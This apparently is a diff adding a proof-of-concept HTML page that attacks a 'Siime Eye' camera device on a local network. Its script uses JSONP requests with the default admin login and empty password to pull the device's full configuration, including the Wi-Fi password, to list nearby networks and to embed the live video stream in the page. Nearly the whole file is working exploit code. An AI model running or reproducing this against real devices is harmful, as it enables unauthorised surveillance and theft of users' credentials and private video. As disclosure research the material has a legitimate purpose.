@@ -1,0 +1,95 @@
+<html>
+<head>
+  <style>
+  body {
+	margin-top: 10px;
+	font-family: sans-serif;
+	width: 80%;
+	margin: 10px auto;
+  }
+  #pulled {
+	border-style: dashed;
+	border-width: thin;
+	font-family: "Consolas", monospace;
+	word-wrap: break-word;
+  }
+  #localWifi {
+	margin-top: 10px;
+	border-style: dashed;
+	border-width: thin;
+	font-family: "Consolas", monospace;
+	word-wrap: break-word;
+  }
+  #videoStream {
+	margin-top: 10px;
+	border-style: dashed;
+	border-width: thin;
+	font-family: "Consolas", monospace;
+	word-wrap: break-word;
+  }
+  </style>
+</head>
+<body>
+  <div id="content">
+    Siime Eye is at <b><div id="origin"></div></b><br>
+    <hr>
+	<p>
+		Video stream<br>
+		<div id="videoStream"></div>
+	</p>
+	<p>
+		Local WiFi Networks<br>
+		<div id="localWifi"></div>
+	</p>
+	<p>
+		Big data dump<br>
+       		<div id="pulled"></div>
+	</p>
+  </div>
+<script>
+	var vulnDevice = "Siime Eye Data Dump";
+	var ip = "192.168.1.1";
+
+	var configInfo = "http://admin:@" + ip + "/get_params.cgi?json=2&jsonp_callback=dildodump";
+	var tag = document.createElement("script");
+	tag.src = configInfo;
+
+	var wifiNear = "http://admin:@" + ip + "/wifi_scan.cgi?json=2&jsonp_callback=wifinear";
+	var wifiTag = document.createElement("script");
+	wifiTag.src = wifiNear;
+
+	var streamPull = "http://admin:@" + ip + "/request_av.cgi?audio=0&video=1&stream=0&json=2&jsonp_callback=stream";
+	var streamTag = document.createElement("script");
+	streamTag.src = streamPull;
+
+	document.getElementsByTagName("head")[0].appendChild(tag);
+	document.getElementsByTagName("head")[0].appendChild(wifiTag);
+	document.getElementsByTagName("head")[0].appendChild(streamTag);
+
+	document.getElementById("origin").innerHTML=ip;
+
+	function dildodump(data) {
+		document.getElementById("pulled").innerHTML=JSON.stringify(data);
+		//alert("Your wifi password is " + data.wifi_wpapsk);
+	}
+	
+	function wifinear(data){
+		document.getElementById("localWifi").innerHTML=JSON.stringify(data);
+		//alert("Here's a some APs near you: " + data.ap[0].ssid + ", " + data.ap[1].ssid + ", " + data.ap[2].ssid + ", " + data.ap[3].ssid + ", " + data.ap[4].ssid + ", " + data.ap[5].ssid + ".");
+	}
+	
+	function stream(data){
+		var streamHolder = document.createElement("img");
+		var streamSource = "http://admin:@" + ip + "/videostream.cgi?stream=0&id=" + data.id;
+		var linebreak = document.createElement("br");
+		console.log(streamSource);
+		streamHolder.src = streamSource;
+		document.getElementById("videoStream").innerHTML=JSON.stringify(data);
+		document.getElementById("videoStream").appendChild(linebreak);
+		document.getElementById("videoStream").appendChild(streamHolder);
+	}
+
+
+</script>
+</body>
+</html>
